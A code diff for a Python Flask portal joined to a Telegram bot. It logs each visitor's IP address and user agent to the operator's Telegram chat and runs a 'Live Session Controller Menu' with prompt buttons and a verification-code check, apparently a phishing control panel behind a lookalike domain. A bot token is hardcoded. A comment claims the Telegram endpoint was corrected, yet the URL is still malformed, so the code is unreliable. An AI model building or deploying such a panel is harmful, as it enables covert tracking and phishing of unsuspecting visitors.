@@ -1,5 +1,5 @@
 import logging
-from multiprocessing import Process
+import threading
 from flask import Flask, request
 import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -12,9 +12,10 @@ BOT_TOKEN = "8954791203:AAFy_LrYlq01lKoNig42XZPzHOoMyjjJG2o"
 CHAT_ID = "6546086469" 
 CORRECT_VERIFICATION_CODE = "SECRET123"
 
-# ==========================================
-# 🌐 PROCESS 1: WEB TRACKER (FLASK)
-# ==========================================
+# Fixed: Removed the accidental line break inside the string quotes
+MY_WEBSITE_URL = "https://corevista-netgoogle.lovable.app"
+
+# Initialize Flask application engine
 flask_app = Flask(__name__)
 
 PORTAL_HTML = """
@@ -47,12 +48,14 @@ PORTAL_HTML = """
 """
 
 def send_alert_to_telegram(message):
+    """Dispatches direct URL requests to ensure traffic clears cloud proxies."""
+    # Fixed: Corrected the endpoint to api.telegram.org and added the /bot prefix
     url = f"https://telegram.org{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
     try: 
-        requests.post(url, json=payload)
+        requests.post(url, json=payload, timeout=5)
     except Exception as e: 
-        print(f"Error sending log to Telegram: {e}")
+        print(f"Network error routing alert packet: {e}")
 
 @flask_app.route('/', methods=['GET', 'POST'])
 def web_portal_home():
@@ -63,21 +66,19 @@ def web_portal_home():
         f"🚨 *NEW VISIT DETECTED*\n\n"
         f"🌐 *IP Address:* `{visitor_ip}`\n"
         f"🖥️ *User Agent:* {user_agent}\n\n"
-        f"Use /start in your bot chat to pull up the control panel dashboard."
+        f"Open your bot chat and use /start to view control actions."
     )
     send_alert_to_telegram(log_message)
     return PORTAL_HTML
 
-def run_flask():
-    flask_app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
-
 # ==========================================
-# 🤖 PROCESS 2: TELEGRAM BOT CONTROL PANEL
+# 🤖 ASYNCHRONOUS TELEGRAM TELEMETRY ENGINE
 # ==========================================
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     keyboard = [
+        [InlineKeyboardButton("🔗 Open My Website", url=MY_WEBSITE_URL)],
         [InlineKeyboardButton("🔓 Security Preference", callback_data="header")],
         [
             InlineKeyboardButton("✅ Yes Prompt", callback_data="yes_prompt"),
@@ -95,7 +96,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await update.message.reply_text(
-        text="⚙️ *Live Session Controller Menu*:",
+        text=f"⚙️ *Live Session Controller Menu*:\nYour tracking domain is set to: {MY_WEBSITE_URL}",
         reply_markup=reply_markup,
         parse_mode="Markdown"
     )
@@ -121,21 +122,19 @@ async def verify_text_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     else:
         await update.message.reply_text("❌ Validation failure. Code is incorrect.")
 
-def run_telegram_bot():
+# ==========================================
+# 🚀 HOOK INTO RENDER'S WEB BIND ENGINE
+# ==========================================
+def init_polling_worker():
+    """Runs polling inside an independent background thread cleanly."""
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_click_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, verify_text_code))
-    
-    print("Telegram system starting standard polling cycle...")
-    app.run_polling(allowed_updates=Update.ALL_TYPES)
+    app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)
 
 if __name__ == '__main__':
-    web_process = Process(target=run_flask)
-    bot_process = Process(target=run_telegram_bot)
+    bot_worker = threading.Thread(target=init_polling_worker, daemon=True)
+    bot_worker.start()
     
-    web_process.start()
-    bot_process.start()
-    
-    web_process.join()
-    bot_process.join()
+    flask_app.run(host='0.0.0.0', port=5000)
